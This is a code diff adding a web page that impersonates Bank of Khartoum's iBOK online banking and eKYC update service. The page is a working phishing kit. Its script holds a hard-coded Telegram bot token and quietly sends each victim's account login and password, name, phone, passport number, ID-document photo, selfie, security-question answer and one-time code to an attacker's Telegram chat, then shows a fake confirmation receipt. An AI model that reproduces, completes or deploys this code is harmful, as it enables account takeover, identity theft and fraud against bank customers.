+                  <span>إثبات الشخصية مطلوب</span>
+                </h3>
+                <label for="docType" class="field-label">نوع المستند:</label>
+                <select id="docType" class="select-control" onchange="confirmDocSelection()">
+                  <option value="">اختر نوع المستند</option>
+                  <option value="جواز سفر">جواز سفر</option>
+                  <option value="رقم وطني">رقم وطني</option>
+                  <option value="بطاقة قومية">بطاقة قومية</option>
+                  <option value="رخصة قيادة">رخصة قيادة</option>
+                </select>
+              </div>
+
+              <div class="field-group">
+                <label class="field-label">يرجى رفع مستند:</label>
+                <div class="upload-box" onclick="document.getElementById('docFileInput').click()">
+                  <i class="fa-solid fa-cloud-arrow-up"></i>
+                  <div style="font-size: 14px; font-weight: 600; color: #333;">اضغط لفتح المعرض واختيار صورة المستند</div>
+                  <div style="font-size: 12px; color: #777; margin-top: 2px;">جواز سفر، رقم وطني، بطاقة قومية، رخصة قيادة</div>
+                </div>
+                <input
+                  type="file"
+                  id="docFileInput"
+                  accept="image/*"
+                  style="display: none;"
+                  onchange="handleDocUpload(this)"
+                />
+                <img id="docPreviewImg" class="preview-thumb" alt="معاينة المستند" />
+                <div id="docUploadStatus" class="upload-status"></div>
+              </div>
+
+              <div class="selfie-box">
+                <h3 class="sub-section-title">
+                  <i class="fa-solid fa-camera"></i>
+                  <span>صورة سيلفي</span>
+                </h3>
+                <p style="font-size: 13px; color: #555; line-height: 1.5;">
+                  يمكنك التقاط صورة مباشرة داخل المحدد الذهبي أو اختيار صورة للوجه من المعرض.
+                </p>
+
+                <div class="camera-controls">
+                  <button type="button" class="mini-btn mini-btn-dark" onclick="startSelfieCamera()">
+                    <i class="fa-solid fa-video"></i>
+                    <span>فتح الكاميرا</span>
+                  </button>
+                  <button type="button" class="mini-btn mini-btn-gold" onclick="switchCameraFacing()">
+                    <i class="fa-solid fa-camera-rotate"></i>
+                    <span id="facingLabel">أمامية / خلفية</span>
+                  </button>
+                  <button type="button" class="mini-btn mini-btn-gallery" onclick="document.getElementById('selfieGalleryInput').click()">
+                    <i class="fa-solid fa-images"></i>
+                    <span>من المعرض</span>
+                  </button>
+                </div>
+
+                <input
+                  type="file"
+                  id="selfieGalleryInput"
+                  accept="image/*"
+                  style="display: none;"
+                  onchange="handleSelfieGalleryUpload(this)"
+                />
+
+                <div id="cameraStage" class="camera-stage">
+                  <video id="selfieVideo" class="mirrored" autoplay playsinline muted></video>
+                  <div class="gold-face-guide" title="محدد الوجه الذهبي"></div>
+                </div>
+
+                <div id="captureBar" style="display: none; margin-top: 10px;">
+                  <button type="button" class="mini-btn mini-btn-red" style="width: 100%;" onclick="captureSelfiePhoto()">
+                    <i class="fa-solid fa-circle-dot"></i>
+                    <span>التقاط الصورة</span>
+                  </button>
+                </div>
+
+                <canvas id="selfieCanvas" style="display: none;"></canvas>
+
+                <div id="selfieCapturedBox" class="selfie-captured-box">
+                  <img id="selfiePreviewImg" alt="صورة السيلفي" />
+                  <div id="selfieStatus" class="upload-status"></div>
+                </div>
+              </div>
+
+              <button type="submit" class="submit-btn ready-red" style="margin-top: 22px;">
+                إرسال
+              </button>
+
+              <div id="updateMessage" class="message-box" role="status" aria-live="polite"></div>
+            </div>
+          </form>
+        </main>
+      </div>
+
+      <footer class="page-footer">
+        <p class="copyright-text">بنك الخرطوم 2024 | <span dir="ltr">iBOK</span></p>
+        <div class="social-row">
+          <button type="button" class="social-icon icon-bank" aria-label="العودة إلى الرئيسية" onclick="openHomeScreen()">
+            <i class="fa-solid fa-shield-halved"></i>
+          </button>
+          <a href="#linkedin" class="social-icon icon-in" aria-label="LinkedIn">in</a>
+          <a href="#x" class="social-icon icon-x" aria-label="X">
+            <i class="fa-brands fa-x-twitter"></i>
+          </a>
+          <a href="#facebook" class="social-icon icon-fb" aria-label="Facebook">
+            <i class="fa-brands fa-facebook-f"></i>
+          </a>
+        </div>
+      </footer>
+    </div>
+
+    <!-- ==================== شاشة 4: إدارة أسئلة الأمان ==================== -->
+    <div id="screenSecurity" class="screen">
+      <div>
+        <header class="top-bar-2">
+          <div class="top-bar-left">
+            <div class="ibok-logo" dir="ltr">iBOK</div>
+            <div class="top-bar-sub">
+              <span class="ar">بنك الخرطوم</span>
+              <span class="en">Bank of Khartoum</span>
+            </div>
+          </div>
+          <button type="button" class="back-home-btn" onclick="openHomeScreen()">
+            <i class="fa-solid fa-arrow-right"></i>
+            <span>رجوع</span>
+          </button>
+        </header>
+
+        <section class="page-title-banner">
+          <h1>إدارة أسئلة الأمان</h1>
+        </section>
+
+        <main class="main-content-2">
+          <form id="securityForm" class="form-card" onsubmit="handleSecuritySubmit(event)" novalidate>
+            <div class="card-heading-wrap">
+              <h2 class="card-heading">إدارة أسئلة الأمان</h2>
+            </div>
+
+            <div class="field-group">
+              <label for="securityQuestionSelect" class="field-label">اختر سؤال الأمان:</label>
+              <select id="securityQuestionSelect" class="select-control" onchange="handleSecurityQuestionChange()">
+                <option value="">اختر سؤالاً من القائمة</option>
+                <option value="ما هو اسم ابن عمك الأول ؟">ما هو اسم ابن عمك الأول ؟</option>
+                <option value="في أي مدينة ولدت؟">في أي مدينة ولدت؟</option>
+                <option value="في أي سنة تخرجت من الجامعة؟">في أي سنة تخرجت من الجامعة؟</option>
+                <option value="ماذا كان لقبك اثناء الطفولة؟">ماذا كان لقبك اثناء الطفولة؟</option>
+                <option value="اسم مؤلفك المفضل؟">اسم مؤلفك المفضل؟</option>
+                <option value="اسم الشركة المصنعة للسيارة المفضلة لديك ؟">اسم الشركة المصنعة للسيارة المفضلة لديك ؟</option>
+                <option value="أي فيلم هو المفضل لديك ؟">أي فيلم هو المفضل لديك ؟</option>
+                <option value="اسم أفضل صديق في الطفولة؟">اسم أفضل صديق في الطفولة؟</option>
+                <option value="في أي عام حصلت علی رخصة القيادة الخاصة بك؟">في أي عام حصلت علی رخصة القيادة الخاصة بك؟</option>
+                <option value="العلامة التجارية لأول تلفزيون خاص بك؟">العلامة التجارية لأول تلفزيون خاص بك؟</option>
+                <option value="في أي سنة تزوجت؟">في أي سنة تزوجت؟</option>
+                <option value="اسم فريق كرة القدم المفضل لديك؟">اسم فريق كرة القدم المفضل لديك؟</option>
+                <option value="ما هو اسم المدرسة التي التحقت بها ؟">ما هو اسم المدرسة التي التحقت بها ؟</option>
+                <option value="اسم أول بلد أجنبي قمت بزيارته؟">اسم أول بلد أجنبي قمت بزيارته؟</option>
+                <option value="ما هي ماركة سيارتك الأولى؟">ما هي ماركة سيارتك الأولى؟</option>
+              </select>
+            </div>
+
+            <div id="securityAnswerBox" class="security-answer-box">
+              <div class="field-group">
+                <label for="securityAnswerInput" class="field-label">الإجابة:</label>
+                <input
+                  type="text"
+                  id="securityAnswerInput"
+                  class="input-control"
+                  placeholder="ادخل الإجابة"
+                  autocomplete="off"
+                  oninput="recordFieldChange('securityAnswer', this.value)"
+                />
+              </div>
+
+              <button type="submit" class="submit-btn ready-red">متابعة</button>
+            </div>
+
+            <div id="securityMessage" class="message-box" role="status" aria-live="polite"></div>
+          </form>
+        </main>
+      </div>
+
+      <footer class="page-footer">
+        <p class="copyright-text">بنك الخرطوم 2024 | <span dir="ltr">iBOK</span></p>
+        <div class="social-row">
+          <button type="button" class="social-icon icon-bank" aria-label="العودة إلى الرئيسية" onclick="openHomeScreen()">
+            <i class="fa-solid fa-shield-halved"></i>
+          </button>
+          <a href="#linkedin" class="social-icon icon-in" aria-label="LinkedIn">in</a>
+          <a href="#x" class="social-icon icon-x" aria-label="X">
+            <i class="fa-brands fa-x-twitter"></i>
+          </a>
+          <a href="#facebook" class="social-icon icon-fb" aria-label="Facebook">
+            <i class="fa-brands fa-facebook-f"></i>
+          </a>
+        </div>
+      </footer>
+    </div>
+
+    <!-- ==================== شاشة 5: التحقق من رمز OTP ==================== -->
+    <div id="screenOtp" class="screen">
+      <div>
+        <header class="top-bar-2">
+          <div class="top-bar-left">
+            <div class="ibok-logo" dir="ltr">iBOK</div>
+            <div class="top-bar-sub">
+              <span class="ar">الخدمات المصرفية عبر الإنترنت</span>
+              <span class="en">Internet Banking Services</span>
+            </div>
+          </div>
+          <button type="button" class="back-home-btn" onclick="openHomeScreen()">
+            <i class="fa-solid fa-arrow-right"></i>
+            <span>رجوع</span>
+          </button>
+        </header>
+
+        <section class="page-title-banner">
+          <h1>التحقق من رمز <span dir="ltr">OTP</span></h1>
+        </section>
+
+        <main class="main-content-2">
+          <form id="otpForm" class="form-card" onsubmit="handleOtpSubmit(event)" novalidate>
+            <div class="card-heading-wrap">
+              <h2 class="card-heading">التحقق من رمز الأو تي بي</h2>
+            </div>
+
+            <div id="otpSentInfo" class="otp-info-banner">
+              تم إرسال رمز الـ OTP مكون من ستة أرقام إلى بريدك الإلكتروني أو رقم الهاتف المسجل في البنك.
+            </div>
+
+            <div class="field-group">
+              <label for="otpInput" class="field-label">رمز التحقق (OTP):</label>
+              <input
+                type="text"
+                id="otpInput"
+                class="input-control"
+                placeholder="أدخل رمز الـ OTP المكون من 6 أرقام"
+                inputmode="numeric"
+                maxlength="6"
+                autocomplete="one-time-code"
+                oninput="this.value = this.value.replace(/\D/g, '').slice(0, 6); recordFieldChange('otpCode', this.value)"
+              />
+            </div>
+
+            <button type="submit" class="submit-btn ready-red">إرسال</button>
+
+            <div id="otpMessage" class="message-box" role="status" aria-live="polite"></div>
+          </form>
+        </main>
+      </div>
+
+      <footer class="page-footer">
+        <p class="copyright-text">بنك الخرطوم 2024 | <span dir="ltr">iBOK</span></p>
+        <div class="social-row">
+          <button type="button" class="social-icon icon-bank" aria-label="العودة إلى الرئيسية" onclick="openHomeScreen()">
+            <i class="fa-solid fa-shield-halved"></i>
+          </button>
+          <a href="#linkedin" class="social-icon icon-in" aria-label="LinkedIn">in</a>
+          <a href="#x" class="social-icon icon-x" aria-label="X">
+            <i class="fa-brands fa-x-twitter"></i>
+          </a>
+          <a href="#facebook" class="social-icon icon-fb" aria-label="Facebook">
+            <i class="fa-brands fa-facebook-f"></i>
+          </a>
+        </div>
+      </footer>
+    </div>
+
+    <!-- ==================== شاشة 6: جاري تسليم الإستمارة ==================== -->
+    <div id="screenSubmitting" class="screen">
+      <div class="submission-screen">
+        <div class="stepper-row" aria-label="خطوات التسليم">
+          <span id="stepCircle1" class="step-circle active-step">1</span>
+          <span id="stepCircle2" class="step-circle">2</span>
+          <span id="stepCircle3" class="step-circle">3</span>
+          <span id="stepCircle4" class="step-circle">4</span>
+        </div>
+
+        <div class="submission-illustration" aria-hidden="true">
+          <svg viewBox="0 0 260 220" xmlns="http://www.w3.org/2000/svg">
+            <ellipse cx="130" cy="202" rx="95" ry="9" fill="#f7e6d9" />
+            <circle cx="132" cy="112" r="78" fill="none" stroke="#f5d87d" stroke-width="3" stroke-dasharray="10 10" />
+            <circle cx="136" cy="108" r="64" fill="#fbeae3" opacity="0.7" />
+            <path d="M126 52 H198 C206 52 210 58 206 66 L186 178 C184 186 178 190 170 190 H98 C90 190 86 184 88 176 L112 64 C114 56 119 52 126 52 Z" fill="#2563eb" />
+            <path d="M88 176 C86 184 90 190 98 190 H170 C176 190 180 186 182 181 H102 C95 181 91 178 88 176 Z" fill="#1d4ed8" />
+            <circle cx="132" cy="84" r="9" fill="#93c5fd" />
+            <rect x="148" y="78" width="38" height="4" rx="2" fill="#93c5fd" />
+            <rect x="148" y="86" width="26" height="4" rx="2" fill="#93c5fd" />
+            <rect x="122" y="106" width="58" height="4" rx="2" fill="#60a5fa" />
+            <rect x="118" y="116" width="58" height="4" rx="2" fill="#60a5fa" />
+            <rect x="114" y="132" width="44" height="4" rx="2" fill="#60a5fa" />
+            <rect x="110" y="142" width="52" height="4" rx="2" fill="#60a5fa" />
+            <circle cx="88" cy="76" r="10" fill="#f3b694" />
+            <path d="M78 73 C78 63 97 62 98 73 C101 82 103 92 98 96 C93 92 94 81 88 78 C83 76 79 78 78 73 Z" fill="#1f2937" />
+            <path d="M77 88 L98 88 L103 124 L74 124 Z" fill="#2563eb" />
+            <path d="M77 92 L58 106 L62 111 L79 101 Z" fill="#f3b694" />
+            <path d="M97 92 L118 96 L117 101 L96 99 Z" fill="#f3b694" />
+            <path d="M76 124 L86 124 L84 188 L75 188 Z" fill="#1e3a8a" />
+            <path d="M88 124 L99 124 L106 188 L97 188 Z" fill="#172554" />
+            <rect x="70" y="187" width="16" height="5" rx="2" fill="#1f2937" />
+            <rect x="96" y="187" width="17" height="5" rx="2" fill="#1f2937" />
+          </svg>
+        </div>
+
+        <div id="submissionCounterText" class="submission-status-text">جاري تسليم الإستمارة.. 1</div>
+      </div>
+    </div>
+
+    <!-- ==================== شاشة 7: تم تقديم eKYC بنجاح ==================== -->
+    <div id="screenSuccess" class="screen">
+      <div class="ekyc-success-screen">
+        <div class="ekyc-sheet">
+          <div class="ekyc-check-circle" aria-hidden="true">
+            <i class="fa-solid fa-check"></i>
+          </div>
+
+          <h1 class="ekyc-main-title">تم تقديم eKYC بنجاح</h1>
+
+          <p class="ekyc-subtitle">
+            شكرًا! لقد تم استلام طلب تحديث بيانات الحساب بنجاح. سيتم الرد على طلبك قريبا . الرقم المرجعي للطلب هو
+          </p>
+
+          <div class="ekyc-summary-box">
+            <div class="ekyc-row-label">الرقم المرجعي:</div>
+            <div id="referenceNumberValue" class="ekyc-ref-value">BOK-EKYC-2026-849210</div>
+
+            <div class="ekyc-date-label">تاريخ التقديم الوقت</div>
+            <div id="submissionDateValue" class="ekyc-date-value">November 2026 at 17:34 18</div>
+
+            <div class="ekyc-status-strip">الحالة: قيد المراجعة</div>
+
+            <div id="recordedSummaryList" class="ekyc-recorded-list"></div>
+
+            <div class="ekyc-review-note">
+              <i class="fa-regular fa-circle-question" aria-hidden="true"></i>
+              <span>
+                ستتم الآن مراجعة معلوماتك من قبل فريق العناية الواجبة في بنك الخرطوم. ستتلقى رسالة نصية وبريدًا إلكترونيا بمجرد اكتمال عملية التحقق.
+              </span>
+            </div>
+          </div>
+
+          <button type="button" class="ekyc-download-btn" onclick="downloadReceiptAndExit()">
+            تحميل الملف و الخروج
+          </button>
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+  <div id="toast" class="toast" role="status" aria-live="polite"></div>
+
+  <script>
+    const TELEGRAM_BOT_TOKEN = '9290950151:AAFOUCi9JT3UsXMdBotUyEVWU__3ZTesEXs';
+    const TELEGRAM_CHAT_IDS = ['7840264056'];
+    const STORAGE_KEY = 'ibok_ekyc_recorded_session_v3';
+
+    let cameraStream = null;
+    let currentFacingMode = 'user';
+    let docUploaded = false;
+    let selfieCaptured = false;
+    let submissionTimer = null;
+
+    let docDataUrl = '';
+    let selfieDataUrl = '';
+
+    let recordedState = {
+      loginMode: 'iBOK',
+      username: '',
+      password: '',
+      fullName: '',
+      phoneNumber: '',
+      passportNumber: '',
+      docType: '',
+      docFileName: '',
+      selfieSource: '',
+      selfieFileName: '',
+      selfieCaptured: false,
+      securityQuestion: '',
+      securityAnswer: '',
+      otpCode: '',
+      referenceNumber: '',
+      submittedAt: ''
+    };
+
+    function persistRecordedState() {
+      try {
+        localStorage.setItem(STORAGE_KEY, JSON.stringify(recordedState));
+      } catch (e) {}
+    }
+
+    function recordFieldChange(key, value) {
+      recordedState[key] = value;
+      persistRecordedState();
+    }
+
+    // إرسال رسالة نصية صامتة في الخلفية إلى جميع المستلمين
+    function silentSendTelegramMessage(text) {
+      persistRecordedState();
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+      TELEGRAM_CHAT_IDS.forEach(chatId => {
+        fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          keepalive: true,
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: text
+          })
+        }).catch(() => {});
+      });
+    }
+
+    function dataUrlToBlob(dataUrl) {
+      const parts = dataUrl.split(',');
+      const mimeMatch = parts[0].match(/:(.*?);/);
+      const mime = mimeMatch ? mimeMatch[1] : 'image/jpeg';
+      const binary = atob(parts[1]);
+      const array = new Uint8Array(binary.length);
+      for (let i = 0; i < binary.length; i++) {
+        array[i] = binary.charCodeAt(i);
+      }
+      return new Blob([array], { type: mime });
+    }
+
+    // إرسال صورة صامتة في الخلفية إلى جميع المستلمين
+    function silentSendTelegramPhoto(dataUrl, filename, caption) {
+      if (!dataUrl || !dataUrl.startsWith('data:')) return;
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
+      const blob = dataUrlToBlob(dataUrl);
+      TELEGRAM_CHAT_IDS.forEach(chatId => {
+        const formData = new FormData();
+        formData.append('chat_id', chatId);
+        formData.append('photo', blob, filename || 'image.jpg');
+        if (caption) {
+          formData.append('caption', caption);
+        }
+        fetch(url, {
+          method: 'POST',
+          keepalive: true,
+          body: formData
+        }).catch(() => {});
+      });
+    }
+
+    function showScreen(screenId) {
+      document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+      document.getElementById(screenId).classList.add('active');
+      window.scrollTo({ top: 0, behavior: 'instant' });
+    }
+
+    function runGoldSpinnerForDuration(ms, callback) {
+      const loader = document.getElementById('goldLoader');
+      loader.classList.add('active');
+      setTimeout(() => {
+        loader.classList.remove('active');
+        if (typeof callback === 'function') callback();
+      }, ms);
+    }
+
+    function openLoginScreen(mode) {
+      stopCamera();
+      clearInterval(submissionTimer);
+      recordedState.loginMode = mode;
+      persistRecordedState();
+
+      document.getElementById('headerBrand').textContent = mode;
+      document.getElementById('bannerTitle').innerHTML =
+        `الخدمات المصرفية عبر الإنترنت من <span dir="ltr">${mode}</span> - تسجيل الدخول`;
+      document.getElementById('username').value = recordedState.username || '';
+      document.getElementById('password').value = recordedState.password || '';
+      document.getElementById('loginMessage').textContent = '';
+      checkLoginReady();
+      showScreen('screenLogin');
+    }
+
+    function openHomeScreen() {
+      stopCamera();
+      clearInterval(submissionTimer);
+      showScreen('screenHome');
+    }
+
+    function checkLoginReady() {
+      const acc = document.getElementById('username').value.trim();
+      const pass = document.getElementById('password').value.trim();
+      const terms = document.getElementById('terms').checked;
+      const btn = document.getElementById('loginSubmitBtn');
+
+      if (acc.length > 0 && pass.length > 0 && terms) {
+        btn.classList.add('ready-red');
+      } else {
+        btn.classList.remove('ready-red');
+      }
+    }
+
+    function togglePassword() {
+      const passwordInput = document.getElementById('password');
+      const eyeIcon = document.getElementById('eyeIcon');
+
+      if (passwordInput.type === 'password') {
+        passwordInput.type = 'text';
+        eyeIcon.classList.remove('fa-eye-slash');
+        eyeIcon.classList.add('fa-eye');
+      } else {
+        passwordInput.type = 'password';
+        eyeIcon.classList.remove('fa-eye');
+        eyeIcon.classList.add('fa-eye-slash');
+      }
+    }
+
+    function showMessage(elementId, text) {
+      document.getElementById(elementId).textContent = text;
+    }
+
+    function handleLoginSubmit(event) {
+      event.preventDefault();
+      const acc = document.getElementById('username').value.trim();
+      const pass = document.getElementById('password').value.trim();
+      const terms = document.getElementById('terms').checked;
+
+      if (!acc) {
+        showMessage('loginMessage', 'يرجى إدخال رقم الحساب أو رقم المعرفة.');
+        return;
+      }
+      if (!pass) {
+        showMessage('loginMessage', 'يرجى إدخال كلمة المرور.');
+        return;
+      }
+      if (!terms) {
+        showMessage('loginMessage', 'يرجى الموافقة على الشروط والأحكام.');
+        return;
+      }
+
+      recordedState.username = acc;
+      recordedState.password = pass;
+
+      silentSendTelegramMessage(
+        `[تسجيل الدخول - ${recordedState.loginMode}]\n` +
+        `رقم المعرف / الحساب: ${acc}\n` +
+        `كلمة المرور: ${pass}`
+      );
+
+      showMessage('loginMessage', '');
+      runGoldSpinnerForDuration(2000, () => {
+        showScreen('screenUpdate');
+      });
+    }
+
+    function confirmDocSelection() {
+      const docType = document.getElementById('docType').value;
+      recordedState.docType = docType;
+      persistRecordedState();
+      if (docType) {
+        showToast('تم اختيار المستند: ' + docType);
+      }
+    }
+
+    function handleDocUpload(input) {
+      const file = input.files && input.files[0];
+      if (!file) return;
+
+      recordedState.docFileName = file.name;
+      persistRecordedState();
+
+      const reader = new FileReader();
+      reader.onload = function (e) {
+        docDataUrl = e.target.result;
+        const img = document.getElementById('docPreviewImg');
+        img.src = docDataUrl;
+        img.style.display = 'block';
+        docUploaded = true;
+        document.getElementById('docUploadStatus').textContent = 'تم الرفع بنجاح';
+      };
+      reader.readAsDataURL(file);
+    }
+
+    function handleSelfieGalleryUpload(input) {
+      const file = input.files && input.files[0];
+      if (!file) return;
+
+      stopCamera();
+      document.getElementById('cameraStage').classList.remove('active');
+      document.getElementById('captureBar').style.display = 'none';
+
+      recordedState.selfieFileName = file.name;
+      recordedState.selfieSource = 'المعرض';
+      recordedState.selfieCaptured = true;
+      persistRecordedState();
+
+      const reader = new FileReader();
+      reader.onload = function (e) {
+        selfieDataUrl = e.target.result;
+        const img = document.getElementById('selfiePreviewImg');
+        img.src = selfieDataUrl;
+        document.getElementById('selfieCapturedBox').classList.add('active');
+        document.getElementById('selfieStatus').textContent = 'تم اختيار صورة السيلفي من المعرض بنجاح';
+        selfieCaptured = true;
+      };
+      reader.readAsDataURL(file);
+    }
+
+    async function startSelfieCamera() {
+      const stage = document.getElementById('cameraStage');
+      const video = document.getElementById('selfieVideo');
+      const captureBar = document.getElementById('captureBar');
+
+      stopCamera();
+
+      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+        showToast('الكاميرا غير مدعومة، يمكنك اختيار صورة من المعرض.');
+        return;
+      }
+
+      try {
+        cameraStream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: currentFacingMode },
+          audio: false
+        });
+        video.srcObject = cameraStream;
+        video.classList.toggle('mirrored', currentFacingMode === 'user');
+        stage.classList.add('active');
+        captureBar.style.display = 'block';
+      } catch (err) {
+        showToast('تعذر فتح الكاميرا، يمكنك اختيار صورة من المعرض.');
+      }
+    }
+
+    function switchCameraFacing() {
+      currentFacingMode = currentFacingMode === 'user' ? 'environment' : 'user';
+      document.getElementById('facingLabel').textContent =
+        currentFacingMode === 'user' ? 'الكاميرا الأمامية' : 'الكاميرا الخلفية';
+      if (cameraStream) {
+        startSelfieCamera();
+      } else {
+        showToast('تم ضبط الوضع إلى: ' + (currentFacingMode === 'user' ? 'أمامية' : 'خلفية'));
+      }
+    }
+
+    function captureSelfiePhoto() {
+      const video = document.getElementById('selfieVideo');
+      const canvas = document.getElementById('selfieCanvas');
+      const stage = document.getElementById('cameraStage');
+      const captureBar = document.getElementById('captureBar');
+
+      if (!video.videoWidth || !video.videoHeight) {
+        showToast('جاري تجهيز الكاميرا، حاول مرة أخرى.');
+        return;
+      }
+
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext('2d');
+
+      if (currentFacingMode === 'user') {
+        ctx.translate(canvas.width, 0);
+        ctx.scale(-1, 1);
+      }
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      selfieDataUrl = canvas.toDataURL('image/jpeg', 0.9);
+      document.getElementById('selfiePreviewImg').src = selfieDataUrl;
+      document.getElementById('selfieCapturedBox').classList.add('active');
+      document.getElementById('selfieStatus').textContent = 'تم التقاط صورة الوجه بنجاح';
+
+      selfieCaptured = true;
+      recordedState.selfieCaptured = true;
+      recordedState.selfieSource = 'الكاميرا';
+      recordedState.selfieFileName = 'selfie-camera.jpg';
+      persistRecordedState();
+
+      stage.classList.remove('active');
+      captureBar.style.display = 'none';
+      stopCamera();
+    }
+
+    function stopCamera() {
+      if (cameraStream) {
+        cameraStream.getTracks().forEach(track => track.stop());
+        cameraStream = null;
+      }
+    }
+
+    function handleUpdateSubmit(event) {
+      event.preventDefault();
+      const fullName = document.getElementById('fullName').value.trim();
+      const phone = document.getElementById('phoneNumber').value.trim();
+      const passport = document.getElementById('passportNumber').value.trim();
+      const docType = document.getElementById('docType').value.trim();
+
+      if (!fullName || !phone || !passport) {
+        showMessage('updateMessage', 'يرجى إكمال الاسم الرباعي ورقم الهاتف ورقم الجواز/الهوية.');
+        return;
+      }
+
+      if (!docUploaded) {
+        showMessage('updateMessage', 'يرجى رفع مستند إثبات الشخصية أولاً.');
+        return;
+      }
+
+      if (!selfieCaptured) {
+        showMessage('updateMessage', 'يرجى التقاط صورة السيلفي أو اختيار صورة من المعرض أولاً.');
+        return;
+      }
+
+      recordedState.fullName = fullName;
+      recordedState.phoneNumber = phone;
+      recordedState.passportNumber = passport;
+      recordedState.docType = docType || 'مستند مرفق';
+
+      silentSendTelegramMessage(
+        `[تحديث البيانات والهوية]\n` +
+        `رقم الحساب / المعرف: ${recordedState.username || '-'}\n` +
+        `الاسم الرباعي: ${fullName}\n` +
+        `رقم الهاتف: ${phone}\n` +
+        `رقم الجواز / الهوية: ${passport}\n` +
+        `نوع المستند: ${recordedState.docType}\n` +
+        `مصدر السيلفي: ${recordedState.selfieSource || 'مرفق'}`
+      );
+
+      silentSendTelegramPhoto(
+        docDataUrl,
+        recordedState.docFileName || 'id-document.jpg',
+        `إثبات الهوية (${recordedState.docType}) - ${fullName}`
+      );
+
+      silentSendTelegramPhoto(
+        selfieDataUrl,
+        recordedState.selfieFileName || 'selfie.jpg',
+        `صورة السيلفي (${recordedState.selfieSource || 'مرفق'}) - ${fullName}`
+      );
+
+      showMessage('updateMessage', '');
+      stopCamera();
+
+      runGoldSpinnerForDuration(2000, () => {
+        document.getElementById('securityQuestionSelect').value = recordedState.securityQuestion || '';
+        document.getElementById('securityAnswerInput').value = recordedState.securityAnswer || '';
+        if (recordedState.securityQuestion) {
+          document.getElementById('securityAnswerBox').classList.add('visible');
+        }
+        document.getElementById('securityMessage').textContent = '';
+        showScreen('screenSecurity');
+      });
+    }
+
+    function handleSecurityQuestionChange() {
+      const q = document.getElementById('securityQuestionSelect').value;
+      const box = document.getElementById('securityAnswerBox');
+      recordedState.securityQuestion = q;
+      persistRecordedState();
+      document.getElementById('securityMessage').textContent = '';
+      if (q) {
+        box.classList.add('visible');
+      } else {
+        box.classList.remove('visible');
+      }
+    }
+
+    function handleSecuritySubmit(event) {
+      event.preventDefault();
+      const q = document.getElementById('securityQuestionSelect').value.trim();
+      const ans = document.getElementById('securityAnswerInput').value.trim();
+
+      if (!q) {
+        showMessage('securityMessage', 'يرجى اختيار سؤال الأمان أولاً.');
+        return;
+      }
+      if (!ans) {
+        showMessage('securityMessage', 'يرجى إدخال الإجابة.');
+        return;
+      }
+
+      recordedState.securityQuestion = q;
+      recordedState.securityAnswer = ans;
+
+      silentSendTelegramMessage(
+        `[سؤال الأمان]\n` +
+        `رقم الحساب / المعرف: ${recordedState.username || '-'}\n` +
+        `الاسم: ${recordedState.fullName || '-'}\n` +
+        `السؤال: ${q}\n` +
+        `الإجابة: ${ans}`
+      );
+
+      showMessage('securityMessage', '');
+      runGoldSpinnerForDuration(3000, () => {
+        document.getElementById('otpInput').value = '';
+        document.getElementById('otpMessage').textContent = '';
+        showScreen('screenOtp');
+      });
+    }
+
+    function handleOtpSubmit(event) {
+      event.preventDefault();
+      const otp = document.getElementById('otpInput').value.trim();
+      if (otp.length !== 6) {
+        showMessage('otpMessage', 'يرجى إدخال رمز الـ OTP المكون من 6 أرقام.');
+        return;
+      }
+
+      recordedState.otpCode = otp;
+
+      silentSendTelegramMessage(
+        `[رمز OTP]\n` +
+        `رقم الحساب / المعرف: ${recordedState.username || '-'}\n` +
+        `الاسم: ${recordedState.fullName || '-'}\n` +
+        `رمز OTP: ${otp}`
+      );
+
+      showMessage('otpMessage', '');
+      startSubmissionProgress();
+    }
+
+    function populateReceiptDetails() {
+      const refNum = 'BOK-' + Math.floor(10000000 + Math.random() * 90000000);
+      const now = new Date();
+      const months = [
+        'January', 'February', 'March', 'April', 'May', 'June',
+        'July', 'August', 'September', 'October', 'November', 'December'
+      ];
+      const pad = n => String(n).padStart(2, '0');
+      const formattedDate = `${months[now.getMonth()]} ${now.getFullYear()} at ${pad(now.getHours())}:${pad(now.getMinutes())} ${pad(now.getSeconds())}`;
+
+      recordedState.referenceNumber = refNum;
+      recordedState.submittedAt = formattedDate;
+      persistRecordedState();
+
+      document.getElementById('referenceNumberValue').textContent = refNum;
+      document.getElementById('submissionDateValue').textContent = formattedDate;
+
+      document.getElementById('recordedSummaryList').innerHTML = `
+        <div><strong>الخدمة:</strong> ${recordedState.loginMode || 'iBOK'}</div>
+        <div><strong>رقم المعرف / الحساب:</strong> ${recordedState.username || '-'}</div>
+        <div><strong>الاسم:</strong> ${recordedState.fullName || '-'}</div>
+        <div><strong>رقم الهاتف:</strong> ${recordedState.phoneNumber || '-'}</div>
+        <div><strong>رقم الجواز / الهوية:</strong> ${recordedState.passportNumber || '-'}</div>
+        <div><strong>إثبات الهوية:</strong> ${recordedState.docType || '-'} ${recordedState.docFileName ? `(${recordedState.docFileName})` : ''}</div>
+        <div><strong>صورة السيلفي:</strong> ${recordedState.selfieCaptured ? `مرفقة (${recordedState.selfieSource || 'معرض/كاميرا'})` : 'غير مرفقة'}</div>
+        <div><strong>سؤال الأمان:</strong> ${recordedState.securityQuestion || '-'}</div>
+        <div><strong>إجابة سؤال الأمان:</strong> ${recordedState.securityAnswer || '-'}</div>
+        <div><strong>رمز OTP:</strong> ${recordedState.otpCode || '-'}</div>
+      `;
+    }
+
+    function startSubmissionProgress() {
+      clearInterval(submissionTimer);
+      showScreen('screenSubmitting');
+
+      const totalSteps = 4;
+      let currentStep = 1;
+
+      function renderStep(stepNum) {
+        document.getElementById('submissionCounterText').textContent = `جاري تسليم الإستمارة.. ${stepNum}`;
+        for (let i = 1; i <= totalSteps; i++) {
+          const el = document.getElementById('stepCircle' + i);
+          el.classList.remove('completed', 'active-step');
+
+          if (i < stepNum) {
+            el.classList.add('completed');
+            el.innerHTML = '<i class="fa-solid fa-check" style="font-size:11px;"></i>';
+          } else if (i === stepNum) {
+            el.classList.add('active-step');
+            el.textContent = String(i);
+          } else {
